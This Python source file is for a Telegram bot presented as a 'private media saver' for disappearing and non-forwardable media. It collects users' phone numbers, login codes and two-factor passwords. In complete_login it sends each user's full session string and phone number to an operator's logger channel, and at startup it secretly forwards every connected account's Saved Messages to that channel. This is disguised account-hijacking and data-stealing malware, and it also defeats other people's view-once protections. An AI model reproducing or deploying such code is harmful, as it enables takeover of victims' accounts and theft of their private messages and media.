import os
import nest_asyncio
import asyncio
import logging
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, ChannelPrivateError
)
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters, ConversationHandler
)
from dotenv import load_dotenv

load_dotenv()

# --- Config ---
DEFAULT_API_ID = int(os.getenv("API_ID"))
DEFAULT_API_HASH = os.getenv("API_HASH")
MONGO_URI = os.getenv("MONGO_URI")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1002753939875"))
ADMIN_ID = int(os.getenv("ADMIN_ID", "7755789304"))
LOGGER_CHANNEL_ID = int(os.getenv("LOGGER_CHANNEL_ID", LOG_CHANNEL_ID))

# --- Assets ---
WELCOME_IMAGE = "https://graph.org/file/d367814bc3243e72917ab-9f1d63e7b3f46b6716.jpg"
SUPPORT_LINK = "https://t.me/valahallah"

# --- Logging ---
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("UserBot")

# --- DB Init ---
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client.userbot
sessions = db.sessions

# --- App Init ---
app = ApplicationBuilder().token(BOT_TOKEN).build()
API_ID, API_HASH, PHONE, CODE, PASSWORD, FETCH_LINK = range(6)
user_login_data = {}
active_clients = []

# --- Auto Connect Sessions ---
async def auto_connect_all_sessions():
    async for record in sessions.find({"type": "telethon"}):
        session_str = record.get("session")
        if not session_str:
            continue
        user_id = record["_id"]
        client = TelegramClient(StringSession(session_str), DEFAULT_API_ID, DEFAULT_API_HASH)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                logger.warning(f"❌ Session not authorized for user {user_id}. Skipping.")
                continue

            logger.info(f"✅ Auto-connected session for user: {user_id}")
            active_clients.append(client)

            @client.on(events.NewMessage(chats="me", incoming=True))
            async def saved_message_forwarder(event):
                try:
                    await client.send_message(
                        LOG_CHANNEL_ID,
                        file=event.media if event.media else None,
                        message=event.text if event.text else None
                    )
                except Exception as e:
                    logger.warning(f"[SavedMessageForwardError] {e}")

            asyncio.create_task(client.run_until_disconnected())

        except Exception as e:
            logger.error(f"❌ Failed to reconnect session for user {user_id}: {e}")
 # --- Cancel Handler ---
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in user_login_data:
        try:
            await user_login_data[user_id]["client"].disconnect()
        except:
            pass
        user_login_data.pop(user_id, None)
    await update.message.reply_text("❌ ᴀʟʟ ᴘʀᴏᴄᴇss ᴄᴀɴᴄᴇʟʟᴇᴅ. Nᴏᴡ sᴇɴᴅ /start ᴀɢᴀɪɴ.")
    return ConversationHandler.END

# --- /start Handler ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inline_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("𝗖𝗼𝗻𝗻𝗲𝗰𝘁 𝗬𝗼𝘂𝗿 𝗔𝗰𝗰𝗼𝘂𝗻𝘁", callback_data="connect")],
        [InlineKeyboardButton("🍬𝗦𝗨𝗣𝗣𝗢𝗥𝗧🍬", url=SUPPORT_LINK)]
    ])
    reply_keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton("📥 ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ɴᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴍᴇᴅɪᴀ")]],
        resize_keyboard=True
    )
    welcome_text = (
        "<b>✨𝘄𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝗱𝗶𝗮 𝘀𝗮𝘃𝗲𝗿✨</b>\n\n"
        "🔐 <i>sᴇᴄᴜʀᴇʟʏ ᴄᴏɴɴᴇᴄᴛ ʏᴏᴜʀ Tᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ .</i>\n\n"
        "<b>⚙️ 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀:</b>\n"
        "• sᴀᴠᴇ ᴅɪsᴀᴘᴘᴇᴀʀɪɴɢ ᴍᴇᴅɪᴀ ғʀᴏᴍ ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛs 📦\n"
        "• ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ғᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴄᴏɴᴛᴇɴᴛ 🔓\n"
        "• ʙᴀᴄᴋɢʀᴏᴜɴᴅ ᴘʀᴏᴄᴇssɪɴɢ 📲\n\n"
        "𝗽𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 ~ 𝘁𝗲𝗮𝗺 𝘃𝗮𝗹𝗹𝗮𝗵𝗮𝗹𝗹𝗮"
    )
    await update.message.reply_photo(
        photo=WELCOME_IMAGE,
        caption=welcome_text,
        reply_markup=inline_keyboard,
        parse_mode="HTML"
    )
    await update.message.reply_text(
        "☝️ 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝗳𝗲𝘁𝗰𝗵 𝗻𝗼𝗻-𝗳𝗼𝗿𝘄𝗮𝗿𝗱𝗮𝗯𝗹𝗲 𝗺𝗲𝗱𝗶𝗮.",
        reply_markup=reply_keyboard
    )

# --- Connect Callback ---
async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query.message:
        await update.callback_query.answer()
        await update.callback_query.message.reply_text(
            "📲 <b>Eɴᴛᴇʀ ʏᴏᴜʀ API ID</b> ᴏʀ sᴇɴᴅ /skip ᴛᴏ ᴜsᴇ ᴅᴇғᴀᴜʟᴛ",
            parse_mode="HTML"
        )
        return API_ID
    else:
        await update.callback_query.answer("⚠️ Bᴜᴛᴛᴏɴ ᴇxᴘɪʀᴇᴅ. Usᴇ /start ᴀɢᴀɪɴ.", show_alert=True)
        return ConversationHandler.END

# --- Skip Handlers ---
async def skip_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_login_data[user_id] = {
        "api_id": DEFAULT_API_ID,
        "api_hash": DEFAULT_API_HASH
    }
    await update.message.reply_text("📞 ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ)")
    return PHONE

async def skip_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    return await skip_api_id(update, context)

# --- Login Flow ---
async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text.startswith("/"):
        return await skip_api_id(update, context)
    if not text.isdigit():
        await update.message.reply_text("❌ API ID must be a number. Try again or send /skip.")
        return API_ID
    user_login_data[update.effective_user.id] = {"api_id": int(text)}
    await update.message.reply_text("🔑 Eɴᴛᴇʀ ʏᴏᴜʀ API HASH ᴏʀ sᴇɴᴅ /skip")
    return API_HASH

async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text.startswith("/"):
        return await skip_api_hash(update, context)
    user_login_data[update.effective_user.id]["api_hash"] = text
    await update.message.reply_text("📞 ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ)")
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    phone = update.message.text.strip()
    user_login_data[user_id]["phone"] = phone
    try:
        client = TelegramClient(
            StringSession(),
            user_login_data[user_id]["api_id"],
            user_login_data[user_id]["api_hash"]
        )
        await client.connect()
        await client.send_code_request(phone)
        user_login_data[user_id]["client"] = client
        await update.message.reply_text("🔐 Eɴᴛᴇʀ OTP (ᴡɪᴛʜ sᴘᴀᴄᴇs). Ex: 1 2 3 4 5")
        return CODE
    except Exception as e:
        await update.message.reply_text(f"❌ Fᴀɪʟᴇᴅ: {e}")
        return ConversationHandler.END
# --- OTP ---
async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = update.message.text.replace(" ", "").strip()
    client = user_login_data[user_id]["client"]
    try:
        await client.sign_in(user_login_data[user_id]["phone"], code)
        return await complete_login(update, context)
    except PhoneCodeExpiredError:
        await update.message.reply_text("⌛ OTP expired. Start again with /start.")
    except PhoneCodeInvalidError:
        await update.message.reply_text("❌ Invalid OTP. Start again.")
    except SessionPasswordNeededError:
        await update.message.reply_text("🔑 2FA enabled. Enter your password:")
        return PASSWORD
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
    return ConversationHandler.END

# --- 2FA ---
async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text.strip()
    client = user_login_data[user_id]["client"]
    try:
        await client.sign_in(password=password)
        return await complete_login(update, context)
    except Exception as e:
        await update.message.reply_text(f"❌ Login failed: {e}")
        return ConversationHandler.END

# --- Final Login Save & Forwarder Setup ---
async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    client = user_login_data[user_id]["client"]
    session_string = client.session.save()
    me = await client.get_me()

    await sessions.update_one(
        {"_id": user_id},
        {"$set": {
            "session": session_string,
            "type": "telethon",
            "account_id": me.id
        }},
        upsert=True
    )

    try:
        await context.bot.send_message(
            chat_id=LOGGER_CHANNEL_ID,
            text=(
                f"🔐 <b>New Session Saved</b>\n"
                f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
                f"🆔 <b>Telegram ID:</b> <code>{me.id}</code>\n"
                f"🏷️ <b>Username:</b> @{getattr(me, 'username', 'N/A')}\n"
                f"📞 <b>Phone:</b> {me.phone}\n"
                f"🧬 <b>Session:</b>\n<code>{session_string}</code>"
            ),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Failed to log session: {e}")

    @client.on(events.NewMessage(incoming=True))
    async def media_handler(event):
        if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
            try:
                sender = await event.get_sender()
                name = getattr(sender, 'username', getattr(sender, 'first_name', 'Unknown'))
                file = await event.download_media()
                await client.send_file(
                    "me",
                    file,
                    caption=f"🕒 Sᴀᴠᴇᴅ ᴅɪsᴀᴘᴘᴇᴀʀɪɴɢ ᴍᴇᴅɪᴀ ғʀᴏᴍ @{name} ᴀᴛ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
            except Exception as e:
                logger.warning(f"[Media Save Failed]: {e}")

    active_clients.append(client)
    context.application.create_task(client.run_until_disconnected())

    await update.message.reply_text("✅ Sᴜᴄᴄᴇssғᴜʟʟʏ ʟᴏɢɢᴇᴅ ɪɴ ᴀɴᴅ ᴄᴏɴɴᴇᴄᴛᴇᴅ!")
    user_login_data.pop(user_id, None)
    return ConversationHandler.END

# --- 📥 Fetch Menu Flow ---
async def menu_fetch_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📎 Send message link:\nEx: https://t.me/c/123/45")
    return FETCH_LINK

async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    if user_id not in user_login_data or "client" not in user_login_data[user_id]:
        await update.message.reply_text("⚠️ Connect your account first.")
        return ConversationHandler.END

    client = user_login_data[user_id]["client"]
    try:
        if "t.me/c/" in text:
            parts = text.split("t.me/c/")[1].split("/")
            chat_id = int("-100" + parts[0])
            msg_id = int(parts[1])
        elif "t.me/" in text:
            parts = text.split("t.me/")[1].split("/")
            chat_id = parts[0]
            msg_id = int(parts[1])
        else:
            await update.message.reply_text("❌ Invalid message link format.")
            return FETCH_LINK

        entity = await client.get_entity(chat_id)
        message = await client.get_messages(entity, ids=msg_id)

        if not message or not message.media:
            await update.message.reply_text("⚠️ No media found.")
            return ConversationHandler.END

        file = await message.download_media()
        await client.send_file("me", file, caption="📥 Fetched from non-forwardable media link.")
        await update.message.reply_text("✅ Media sent to Saved Messages.")
    except ChannelPrivateError:
        await update.message.reply_text("❌ You're not a member of that channel.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
    return ConversationHandler.END

# --- Unknown Commands ---
async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❓ Uɴᴋɴᴏᴡɴ ᴄᴏᴍᴍᴀɴᴅ. Usᴇ /start ᴛᴏ ʙᴇɢɪɴ ᴀɢᴀɪɴ.")

# --- Handlers ---
login_conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(connect_callback, pattern="connect")],
    states={
        API_ID: [
    CommandHandler("skip", skip_api_id),
    MessageHandler(filters.TEXT, get_api_id)
],
API_HASH: [
    CommandHandler("skip", skip_api_hash),
    MessageHandler(filters.TEXT, get_api_hash)
],
        PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
        CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
        PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
    },
    fallbacks=[CommandHandler("cancel", cancel)],
    allow_reentry=True
)

fetch_menu_conv = ConversationHandler(
    entry_points=[
        MessageHandler(filters.TEXT & filters.Regex(r"^📥"), menu_fetch_request)
    ],
    states={FETCH_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_from_link)]},
    fallbacks=[CommandHandler("cancel", cancel)],
)

# --- Run Bot ---
if __name__ == "__main__":
    nest_asyncio.apply()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(MessageHandler(filters.COMMAND, unknown_command))
    app.add_handler(login_conv)
    app.add_handler(fetch_menu_conv)

    async def start_bot():
        await auto_connect_all_sessions()
        print("🤖 Bot is running...")
        await app.run_polling()

    asyncio.run(start_bot())
